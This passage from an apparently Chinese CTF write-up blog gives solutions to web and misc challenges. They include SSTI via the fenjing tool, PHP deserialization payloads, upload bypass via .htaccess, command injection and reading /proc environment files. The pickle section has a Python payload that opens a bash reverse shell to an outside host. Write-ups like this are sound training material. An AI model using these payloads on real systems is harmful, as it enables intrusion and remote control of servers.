<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-68.png"></p>
<p>出来之后就是个简单的SSTI，用fenjing打就行</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-69.png"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m fenjing crack -u http://challenge.qsnctf.com:32027/ --inputs note --method GET</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-70.png"></p>
<h3 id="Upload-Level1"><a href="#Upload-Level1" class="headerlink" title="Upload_Level1"></a>Upload_Level1</h3><p>用Yakti直接传</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-71.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-72.png"></p>
<h3 id="嘿嘿嘿"><a href="#嘿嘿嘿" class="headerlink" title="嘿嘿嘿"></a>嘿嘿嘿</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hhh</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>, <span class="variable">$content</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">yyy</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$path</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$allowed</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span>, <span class="variable">$allowed</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;path = <span class="variable">$path</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;allowed = <span class="variable">$allowed</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;allowed) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;path;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Access Denied!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造目标 yyy 对象（延迟返回 flag.php）</span></span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> <span class="title function_ invoke__">yyy</span>(<span class="string">&quot;flag.php&quot;</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造主对象 hhh</span></span><br><span class="line"><span class="variable">$exploit</span> = <span class="keyword">new</span> <span class="title function_ invoke__">hhh</span>(<span class="variable">$file</span>, <span class="string">&quot;GET_FLAG&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 序列化</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$exploit</span>);</span><br><span class="line"><span class="comment">// O:3:&quot;hhh&quot;:2:&#123;s:4:&quot;file&quot;;O:3:&quot;yyy&quot;:2:&#123;s:4:&quot;path&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;allowed&quot;;b:1;&#125;s:7:&quot;content&quot;;s:8:&quot;GET_FLAG&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-73.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-74.png"></p>
<h3 id="逃"><a href="#逃" class="headerlink" title="逃"></a>逃</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$user</span> = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pswd</span> = <span class="string">&#x27;sunshine&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$obj</span>-&gt;pswd = <span class="string">&#x27;escaping&#x27;</span>; </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br><span class="line"><span class="comment">// O:4:&quot;test&quot;:2:&#123;s:4:&quot;user&quot;;s:4:&quot;test&quot;;s:4:&quot;pswd&quot;;s:8:&quot;escaping&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-75.png"></p>
<h3 id="无参之舞"><a href="#无参之舞" class="headerlink" title="无参之舞"></a>无参之舞</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?exp=<span class="keyword">echo</span>%<span class="number">20</span>readfile(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>()))));</span><br></pre></td></tr></table></figure>

<p>参考文章：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/261800.html">https://www.freebuf.com/articles/web/261800.html</a></p>
<p>多访问几次就能看到flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-76.png"></p>
<h3 id="baby-rce"><a href="#baby-rce" class="headerlink" title="baby rce"></a>baby rce</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET: ?param1[]=a&amp;param2[]=b</span><br><span class="line">POST: payload=<span class="title class_">TYctf</span>::<span class="variable constant_">getKey</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-77.png"></p>
<h3 id="Ez-calculate"><a href="#Ez-calculate" class="headerlink" title="Ez_calculate"></a>Ez_calculate</h3><p>这题只要俩秒内计算页面内的算式即可获得flag，用脚本去算就行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"><span class="keyword">from</span> bs4 import BeautifulSoup</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://challenge.qsnctf.com:30761/&#x27;</span></span><br><span class="line"></span><br><span class="line">with requests.<span class="title function_ invoke__">Session</span>() <span class="keyword">as</span> s:</span><br><span class="line">    <span class="comment"># 获取初始页面并计算答案</span></span><br><span class="line">    response = s.<span class="title function_ invoke__">get</span>(url)</span><br><span class="line">    soup = <span class="title function_ invoke__">BeautifulSoup</span>(response.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">    expression = soup.<span class="title function_ invoke__">find</span>(<span class="string">&#x27;div&#x27;</span>, class_=<span class="string">&#x27;challenge&#x27;</span>).text.<span class="title function_ invoke__">strip</span>()</span><br><span class="line">    result = <span class="keyword">eval</span>(expression)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 提交计算结果</span></span><br><span class="line">    s.<span class="title function_ invoke__">post</span>(url, data=&#123;<span class="string">&#x27;value&#x27;</span>: result&#125;)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 自动访问flag页面</span></span><br><span class="line">    flag_response = s.<span class="title function_ invoke__">get</span>(url + <span class="string">&quot;flag&quot;</span>)</span><br><span class="line">    flag_soup = <span class="title function_ invoke__">BeautifulSoup</span>(flag_response.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 提取并打印flag</span></span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;最终Flag：&quot;</span>, flag_soup.text.<span class="title function_ invoke__">strip</span>())</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-78.png"></p>
<h3 id="My-Blog"><a href="#My-Blog" class="headerlink" title="My Blog"></a>My Blog</h3><p>点击Github会下载一个PDF</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-79.png"></p>
<p>获得账号密码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-80.png"></p>
<p>访问<code>/login.php</code>进入登录口，并用获得的账号密码登录即可获得flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-81.png"></p>
<h3 id="Upload-Level2"><a href="#Upload-Level2" class="headerlink" title="Upload_Level2"></a>Upload_Level2</h3><p>改个<code>Content-Length</code>继续传</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-82.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-83.png"></p>
<h3 id="哎呀大大大黑塔"><a href="#哎呀大大大黑塔" class="headerlink" title="哎呀大大大黑塔"></a>哎呀大大大黑塔</h3><p>这题主要是一开始的脑洞，去B站看大黑塔的PV，用BV号当参数。。。</p>
<p><code>?SQNU=BV1tXckehEd3</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-84.png"></p>
<p>一个简单的反序列</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Secret</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="variable">$key</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">Secret</span>(<span class="string">&quot;SQCTF&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br><span class="line"><span class="comment">// O:6:&quot;Secret&quot;:1:&#123;s:3:&quot;key&quot;;s:5:&quot;SQCTF&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-85.png"></p>
<h3 id="白月光"><a href="#白月光" class="headerlink" title="白月光"></a>白月光</h3><p>一个SSTI，用fenjing直接出</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-86.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-87.png"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m fenjing crack -u http://challenge.qsnctf.com:31268/ --inputs name --method POST</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-88.png"></p>
<h3 id="RceMe"><a href="#RceMe" class="headerlink" title="RceMe"></a>RceMe</h3><p><code>GET：?com=nl /*</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-89.png"></p>
<h3 id="Through"><a href="#Through" class="headerlink" title="Through"></a>Through</h3><p>用双写绕过路径过滤</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-90.png"></p>
<h3 id="开发人员的小失误"><a href="#开发人员的小失误" class="headerlink" title="开发人员的小失误"></a>开发人员的小失误</h3><p>目录爆破</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-91.png"></p>
<p>访问即可获得flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-92.png"></p>
<h3 id="ggoodd"><a href="#ggoodd" class="headerlink" title="ggoodd"></a>ggoodd</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://challenge.qsnctf.com:32116/&#x27;</span></span><br><span class="line">params = &#123;<span class="string">&#x27;json&#x27;</span>: <span class="string">&#x27;&#123;&quot;x&quot;:&quot;cba&quot;&#125;&#x27;</span>&#125;</span><br><span class="line">data = &#123;<span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;abc&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">response = requests.<span class="title function_ invoke__">post</span>(url, params=params, data=data)</span><br><span class="line"><span class="keyword">print</span>(response.text)</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-93.png"></p>
<h3 id="-1"><a href="#-1" class="headerlink" title=""></a></h3><p>千查万别<br>直接读环境变量<code>/proc/1/envirom</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-94.png"></p>
<h3 id="pickle"><a href="#pickle" class="headerlink" title="pickle"></a>pickle</h3><p>简单的pickle，直接反弹shell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Exploit</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 直接触发文件读取操作</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;&quot;&quot;__import__(&#x27;os&#x27;).system(&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/IP/23333 0&gt;&amp;1&quot;&#x27;)&quot;&quot;&quot;</span>,))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成ASCII安全payload</span></span><br><span class="line">payload = pickle.dumps(Exploit(), protocol=<span class="number">0</span>)</span><br><span class="line">b64_payload = base64.b64encode(payload).decode()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;最终Payload: <span class="subst">&#123;b64_payload&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-95.png"></p>
<h3 id="eeaassyy"><a href="#eeaassyy" class="headerlink" title="eeaassyy"></a>eeaassyy</h3><p>手动打开开发者工具</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-96.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-97.png"></p>
<h3 id="自私的小s"><a href="#自私的小s" class="headerlink" title="自私的小s"></a>自私的小s</h3><p>真正的入口在cookie处</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-98.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-99.png"></p>
<p>简单的反序列化</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Genshin_impact</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$value</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$v</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;value = <span class="variable">$v</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>; </span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">Genshin_impact</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理私有属性格式（PHP序列化私有属性的特殊格式）</span></span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">str_replace</span>(</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&#x27;s:20:&quot;&#x27;</span>.<span class="string">&quot;\0Genshin_impact\0value&quot;</span>.<span class="string">&#x27;&quot;;&#x27;</span>, // 原始格式</span><br><span class="line">        <span class="string">&#x27;%&#x27;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&#x27;S:20:&quot;\00Genshin_impact\00value&quot;;&#x27;</span>,    // 转换为大写S的十六进制表示</span><br><span class="line">        <span class="string">&#x27;nonono&#x27;</span>                               // 替换可能存在的%符号</span><br><span class="line">    ],</span><br><span class="line">    <span class="variable">$payload</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$payload</span>);</span><br><span class="line"><span class="comment">// O%3A14%3A%22Genshin_impact%22%3A1%3A%7Bs%3A21%3A%22%00Genshin_impact%00value%22%3Bs%3A20%3A%22system%28%27cat+%2Fflag%27%29%3B%22%3B%7D</span></span><br></pre></td></tr></table></figure>



<h3 id="Look-for-the-homepage"><a href="#Look-for-the-homepage" class="headerlink" title="Look for the homepage"></a>Look for the homepage</h3><p><code>F12</code>抓个包即可看到<code>challenge.php</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-100.png"></p>
<p><code>$verify_code === $code &amp;&amp;$pass1 === $flag</code>直接用数组绕过</p>
<p><code>parse_str</code>存在变量覆盖漏洞，使<code>fly</code>等于<code>value3</code>参数的md5值即可</p>
<p>最终payload</p>
<p><code>GET：verify[]=1&amp;pass1[]=2&amp;pass2=welcome&amp;value3=1</code></p>
<p><code>POST：value1=fly=c4ca4238a0b923820dcc509a6f75849b</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-101.png"></p>
<h3 id="Are-you-from-SQNU"><a href="#Are-you-from-SQNU" class="headerlink" title="Are you from SQNU?"></a>Are you from SQNU?</h3><p>传参见下图</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-102.png"></p>
<h3 id="伪装"><a href="#伪装" class="headerlink" title="伪装"></a>伪装</h3><p>伪造cookie就行</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-103.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-104.png"></p>
<h3 id="图片展示功能"><a href="#图片展示功能" class="headerlink" title="图片展示功能"></a>图片展示功能</h3><p>前面两个上传绕过方法都不行了</p>
<p>直接上传个<code>.htaccess</code>配置文件，配置文件里面意思是在当前目录下，所有文件都会被解析成php代码执行</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-105.png"></p>
<p>然后再上传个<code>1.phtm</code>文件上去</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-106.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-107.png"></p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="可否许我再少年"><a href="#可否许我再少年" class="headerlink" title="可否许我再少年"></a>可否许我再少年</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-108.png"></p>
<h3 id="Welcome-Sign-in（一血）"><a href="#Welcome-Sign-in（一血）" class="headerlink" title="Welcome_Sign_in（一血）"></a>Welcome_Sign_in（一血）</h3><p>找公众号要就行</p>
<p><font style="color:rgb(238, 238, 238);"></font></p>
<h3 id="ez-music1"><a href="#ez-music1" class="headerlink" title="ez_music1"></a>ez_music1</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-109.png"></p>
<h3 id="love-host"><a href="#love-host" class="headerlink" title="love.host"></a>love.host</h3><p>用<code>foremost</code>分解图片，flag在压缩包里面</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-110.png"></p>
<h3 id="阿尼亚"><a href="#阿尼亚" class="headerlink" title="阿尼亚"></a>阿尼亚</h3><p>试了半天的图片隐写，结果在一个网站直接出flag。。。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//www.a.tools/Tool.php?Id=100</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-111.png"></p>
<h3 id="piet"><a href="#piet" class="headerlink" title="piet"></a>piet</h3><p>对应参考文章出的：<a target="_blank" rel="noopener" href="https://blog.csdn.net/MarkRao/article/details/121796707">https://blog.csdn.net/MarkRao/article/details/121796707</a></p>
